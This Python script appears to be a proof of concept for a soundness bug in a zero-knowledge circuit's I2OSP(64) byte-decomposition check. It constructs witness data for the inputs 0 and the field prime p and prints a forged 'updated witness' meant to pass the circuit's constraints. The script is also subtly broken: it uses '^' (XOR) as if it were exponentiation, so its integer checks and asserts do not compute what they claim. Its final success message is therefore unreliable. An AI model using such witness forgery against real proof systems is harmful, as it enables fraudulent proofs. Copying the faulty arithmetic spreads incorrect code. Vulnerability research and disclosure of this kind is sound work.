import json

# Baby Jubjub prime
p = 21888242871839275222246405745257275088548364400416034343698204186575808495617

def vulnerable_I2OSP(input_value, length=64):
    result = []
    value = input_value
    for _ in range(length):
        result.append(value & 255)
        value //= 256
    # Pad with zeros to ensure length is 64
    result = result[::-1] + [0] * (length - len(result))
    return result

def calculate_acc(out):
    acc = [0] * 64
    for i in range(64):
        if i == 0:
            acc[i] = out[i]
        else:
            acc[i] = (256 * acc[i-1] + out[i]) % p
    return acc

# Set of inputs
inputs = [0, p]

print("Demonstrating I2OSP(64) bug:")
print("----------------------------")

# Load the original witness data
witness_data = ["1"] + ["0"] * 129  # 1 constant term + 64 out + 1 in + 64 acc

for i, input_value in enumerate(inputs):
    output = vulnerable_I2OSP(input_value, 64)
    acc = calculate_acc(output)
    
    print(f"\nCase {i+1}:")
    print(f"in = {input_value}")
    print(f"out[64] = {output}")
    print(f"Interpreted as integer: {sum(byte * 256^i for i, byte in enumerate(reversed(output)))}")
    print(f"Modulo p: {sum(byte * 256^i for i, byte in enumerate(reversed(output))) % p}")

    # Create a new witness with the updated output
    new_witness = witness_data.copy()
    new_witness[1:65] = [str(b) for b in output]  # Replace out[64]
    new_witness[65] = str(input_value)  # Update 'in'
    new_witness[66:] = [str(a) for a in acc]  # Update acc[64]

    if i != 0:
        print("\nUpdated witness data:")
        print(json.dumps(new_witness, indent=1))

    # Verify that the output satisfies the I2OSP constraints
    assert len(output) == 64, "Output length should be 64"
    assert all(0 <= byte < 256 for byte in output), "All bytes should be in range [0, 255]"
    assert sum(byte * 256^i for i, byte in enumerate(reversed(output))) == input_value, "Output should represent the input"
    assert acc[-1] == input_value, "Last acc value should equal the input"

print("\nBoth cases satisfy the I2OSP constraints while representing different values.")